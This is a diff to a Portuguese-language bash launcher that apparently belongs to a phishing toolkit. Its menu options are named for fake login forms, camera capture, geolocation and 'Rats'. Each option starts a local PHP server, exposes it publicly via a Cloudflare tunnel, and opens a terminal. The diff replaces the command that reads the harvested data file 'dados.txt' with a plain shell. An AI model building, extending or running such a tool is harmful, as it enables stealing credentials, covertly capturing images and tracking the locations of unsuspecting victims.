@@ -173,7 +173,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
 
             ;;
         2)
@@ -201,7 +201,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         4)
             echo -e "${GREEN}Você escolheu: Formulario + Camera${NC}"
@@ -217,7 +217,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         5)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate${NC}"
@@ -233,7 +233,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         6)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Camera + Rats${NC}"
@@ -248,7 +248,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         7)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Rats${NC}"
@@ -265,7 +265,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         8)
             echo -e "${GREEN}Você escolheu: Login${NC}"
@@ -280,7 +280,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
 
         9)
@@ -296,7 +296,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         10)
             echo -e "${GREEN}Você escolheu: Camera com zoom ${NC}"
@@ -311,7 +311,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         11)
             echo -e "${GREEN}Você escolheu: Login + Camera + Location${NC}"
@@ -326,7 +326,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &   
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         12)
             echo -e "${GREEN}Você escolheu: Login + Location + Rats${NC}"
@@ -342,7 +342,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         13)
             echo -e "${GREEN}Você escolheu: Login + Location${NC}"
@@ -356,7 +356,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'" &
+            $TERMINAL -- "bash" &
             ;;
         0) 
             echo -e "${RED}Saindo...${NC}"
